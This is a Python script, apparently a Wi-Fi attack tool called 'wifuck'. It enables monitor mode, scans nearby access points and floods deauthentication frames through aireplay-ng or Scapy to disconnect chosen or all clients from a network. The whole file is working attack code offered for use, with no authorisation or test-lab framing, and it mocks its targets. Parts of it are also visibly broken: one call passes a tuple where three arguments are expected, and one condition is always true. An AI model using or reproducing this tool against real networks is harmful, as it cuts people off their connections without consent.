#!/usr/bin/env python3

import subprocess, re, csv, sys, os, time, shutil
from datetime import datetime
from scapy.all import *

W = '\033[0m'
R = '\033[31m' 
G = '\033[32m' 
O = '\033[33m' 
B = '\033[34m' 
P = '\033[35m' 
C = '\033[36m' 
GR = '\033[37m'

usage = G+'''
  Usage;
     - no args                    Start normally
     <scan> or <s> or <-s>        Scan AP, you must specify network adapter  |   wifuck scan <network-adapter>
     <deauth> or <d> or <-d>      Sending deauth package using scapy         |   wifuck deauth -a <network-adapter> -c <client> -g <gateway>
                                  if <client> or <gateway> is equal to X,    |     
                                  it's broadcast ff:ff:ff:ff:ff:ff           |   wifuck deauth -a <network-adapter> -c X -g X
'''+W

title = R +''' .S     S.    .S       
.SS     SS.  .SS       
S%S     S%S  S%S       
S%S     S%S  S%S       
S%S     S%S  S&S       
S&S     S&S  S&S       
S&S     S&S  S&S       
S&S     S&S  S&S       
S*S     S*S  S*S       
S*S  .  S*S  S*S       
S*S_sSs_S*S  S*S       
SSS~SSS~S*S  S*S       
             SP        
             Y         
'''+W

active_wireless_networks = []

def checker():        
    if not 'SUDO_UID' in os.environ.keys():
        print(R + "[+] Error - " + O + "Use sudo." + W)
        exit()
    for file_name in os.listdir():
        if ".csv" in file_name:
            print(O + "[+] - Moving existing .csv file in the current directory to the backup folder." + W)
            directory = os.getcwd()
            try:
                os.mkdir(directory + "/backup/")
            except:
                print(GR + "[+] - Backup folder exists." + W)
            timestamp = datetime.now()
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

def init(hacknic):
    print(P + "[+] - Killing interface opened process." + W)
    print(P + "[+] - Enable monitor mode." + W)
    subprocess.run(["airmon-ng", "start", hacknic])
        
def get_adapter():
    wlan_pattern = re.compile("wlan[0-9]")
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
    if len(check_wifi_result) == 0:
        print(R + "[+] Error - " + O + "No wireless adapter found." + W)
        exit()
    print(B + "[+] - Wireless adapter available. \n" + W)
    for index, item in enumerate(check_wifi_result):
        print(C + f"{index}" + B +"-" + C + f"{item}" + W)
    wifi_interface_choice = input(B + "\n[+] - Select adapter : " + W)
    while True:
        try:
            if check_wifi_result[int(wifi_interface_choice)]:
                break
        except:
            print(B + "[+] - Select an network adapter index : " + W)
    hacknic = check_wifi_result[int(wifi_interface_choice)]
    return hacknic

def check_for_essid(essid, lst):
    check_status = True
    if len(lst) == 0:
        return check_status
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False
    return check_status

def get_AP(hacknic):
    discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        while True:
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                    fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                    if ".csv" in file_name:
                        with open(file_name) as csv_h:
                            csv_h.seek(0)
                            csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                            for row in csv_reader:
                                if row["BSSID"] == "BSSID":
                                    pass
                                elif row["BSSID"] == "Station MAC":
                                    break
                                elif check_for_essid(row["ESSID"], active_wireless_networks):
                                    active_wireless_networks.append(row)
            print(P + "[+] - Scanning. Press Ctrl+C ready.\n" + W)
            print(B + "No |\tBSSID              |\tESSID                    |" + W)
            print(B + "___|\t___________________|\t_________________________|" + W)
            for index, item in enumerate(active_wireless_networks):
                print(P + f"{index}\t{item['BSSID']}\t\t{item['ESSID']}" + W)
            time.sleep(1)
    except KeyboardInterrupt:
        print(B + "\n[+] - Stoping scan." + W)
    while True:
        choice = input(B + "[+] - Select access point : " + W)
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print(O + "[+] - Try again." + W)
        
    hackbssid = active_wireless_networks[int(choice)]["BSSID"]
    hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
    return hacknic, hackbssid, hackchannel

def airc_deauth(hacknic, hackbssid, hackchannel):    
    subprocess.run(["iwconfig", hacknic, "channel", hackchannel])
    try:
        print(R)
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
    except KeyboardInterrupt:
        subprocess.run(["airmon-ng", "stop", hacknic])
        print(G + "\n\n[UwU]" + P + "You Get Wifucked" + G + "[UwU]" + W)

def scp_deauth(hacknic, client, hackbssid):
    try:
        while True:
            print(R)
            dot11 = Dot11(addr1=client, addr2=hackbssid, addr3=hackbssid)
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
            sendp(packet, inter=0.1, count=100, iface=hacknic, verbose=1)
    except KeyboardInterrupt:
        subprocess.run(["airmon-ng", "stop", hacknic])
        print(G + "\n\n[UwU]" + P + "You Get Wifucked" + G + "[UwU]" + W)
        
def main():
    checker()
    print(title)        
    if len(sys.argv) == 1:
        hacknic = get_adapter()
        init(hacknic)
        airc_deauth(get_AP(hacknic))
        exit(-1)
    else:
        try:
            if 'scan' or 'deauth' in sys.argv: 
                for a in sys.argv:
                    if a == 'scan':
                        try:
                            print(sys.argv[2])
                            init(sys.argv[2])
                            get_AP(sys.argv[2])
                        except:
                            print("Error, invalid syntax")
                    if a == 'deauth':
                        try:
                            adapter = (sys.argv[sys.argv.index('-a')+1])
                            client = (sys.argv[sys.argv.index('-c')+1])
                            if client == 'X':
                                client = 'ff:ff:ff:ff:ff:ff'
                            gateway = (sys.argv[sys.argv.index('-g')+1])
                            if gateway == 'X':
                                gateway = 'ff:ff:ff:ff:ff:ff'
                            init(adapter)
                            print(scp_deauth(adapter,client,gateway))
                        except:
                            print("Error, invalid syntax")
                            print(usage)
                    else:
                        pass
            else:
                print(usage)
        except:
            print(usage)
            exit(-1)

main()
